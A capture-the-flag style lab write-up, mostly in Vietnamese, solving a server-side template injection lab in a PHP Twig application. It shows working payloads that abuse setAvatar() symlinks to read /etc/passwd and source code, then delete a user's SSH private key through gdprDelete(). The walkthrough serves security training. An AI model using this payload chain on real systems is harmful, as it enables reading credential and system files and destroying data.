# Target Goal:
This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file `/.ssh/id_rsa` from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`
# Analysis:
Sau khi đăng nhập, ứng dụng chứa 2 chức năng cho phép user thay đổi cách hiển thị tên trong các post và upload avatar.

![image](https://github.com/user-attachments/assets/502ec2e7-80da-4553-be63-201b15b30ccc)

Tương tự bài lab 2, chức năng thay đổi cách hiển thị tên trong các post bị dính SSTI. Fuzz với payload `${{<%[%'"}}%\`

![image](https://github.com/user-attachments/assets/c3fafd27-bc35-4f63-92fe-1804d2a67184)

Ta thấy server báo lỗi chứa template engine Twig của PHP.

![image](https://github.com/user-attachments/assets/b9216087-775a-415d-83bb-5f2234ae9115)

Như vậy server có thể render author name bằng `{{blog-post-author-display}}`.

Identify bằng payload
```
blog-post-author-display=user.nickname}}{{7*7
```
![image](https://github.com/user-attachments/assets/2b4b68ff-481b-4f98-a21e-b8c642ca4004)

Ta thấy số `49` đã render thành công. Như vậy mình có thể SSTI tại chức năng này.

Mặt khác, ở chức năng upload avatar, khi upload sai file yêu cầu, một error được trả về từ User class tại `/home/carlos/User.php`. Và server sẽ gọi `User->setAvatar('/tmp/filename', 'MIME_TYPE')` để set avatar cho user.

![image](https://github.com/user-attachments/assets/bda88540-4524-4fe1-805b-6df3cdb1da62)

Ta sẽ tận dụng lỗi SSTI ở trên để gọi hàm `user.setAvatar()` với file bất kì rồi xem avatar để lấy được nội dung file đó. Thử payload sau để set avatar là nội dung file `/etc/passwd`.
```
blog-post-author-display=user.setAvatar('/etc/passwd')
```
Tuy nhiên như đã nói, ta cần thêm 1 tham số `MIME_TYPE`

![image](https://github.com/user-attachments/assets/121ca1b1-0c15-4926-ae05-1cee37a7b7d4)

và vì avatar yêu cầu file ảnh, nên ta truyền thêm `image/jpeg`.
```
blog-post-author-display=user.setAvatar('/etc/passwd','image/jpeg')
```
Truy cập xem avatar, ta thấy nội dung file `/etc/passwd` đã được trả về.

![image](https://github.com/user-attachments/assets/1a6cb1d1-3b9e-4693-a795-b943d3ea1b93)

Sử dụng phương pháp tương tự để xem nội dung class User.
```
blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')
```
![image](https://github.com/user-attachments/assets/d3025bfd-a80d-4e2b-90ee-f2ae9bb045e0)

```
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```
Hàm `setAvatar(filename, mimetype)` sẽ tạo 1 symlink từ avatarLink đến filename. Mặt khác hàm `gdprDelete()` lại có chức xóa cả avatarLink và target nó đang link đến (chính là filename).

Như vậy mình sẽ set avatar là file cần xóa '/home/carlos/.ssh/id_rsa'.
```
blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpeg')
```
![image](https://github.com/user-attachments/assets/74d9cf34-15af-44c9-9972-4742c3672411)

Gọi `user.gdprDelete()` để xóa.
```
blog-post-author-display=user.gdprDelete()
```
## Flag:

![image](https://github.com/user-attachments/assets/452c29b4-d7ea-4b8e-84c4-fcbe4f8613fe)














